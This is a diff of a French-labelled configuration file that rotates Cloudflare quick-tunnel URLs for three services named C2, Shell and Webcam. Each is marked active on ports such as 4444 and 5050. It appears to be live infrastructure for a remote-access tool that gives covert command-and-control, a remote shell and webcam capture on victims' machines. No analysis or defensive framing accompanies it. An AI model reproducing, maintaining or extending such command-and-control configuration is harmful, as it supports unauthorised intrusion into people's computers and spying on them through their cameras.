@@ -1,20 +1,20 @@
-# Tunnels Cloudflared - Mise à jour: 2025-08-07 07:29:36
+# Tunnels Cloudflared - Mise à jour: 2025-08-07 18:13:08
 # Version: 3.1
 
 [C2]
-URL=https://crawford-attending-distant-receivers.trycloudflare.com
+URL=https://dialog-implement-ate-kenny.trycloudflare.com
 PORT=4444
 TYPE=socket
 STATUS=ACTIVE
 
 [Shell]
-URL=https://ethernet-implement-julia-homes.trycloudflare.com
+URL=https://calculations-powered-newly-const.trycloudflare.com
 PORT=5050
 TYPE=socket
 STATUS=ACTIVE
 
 [Webcam]
-URL=https://angels-opinions-priorities-widely.trycloudflare.com
+URL=https://pad-significantly-prepaid-about.trycloudflare.com
 PORT=8090
 TYPE=flask
 STATUS=ACTIVE
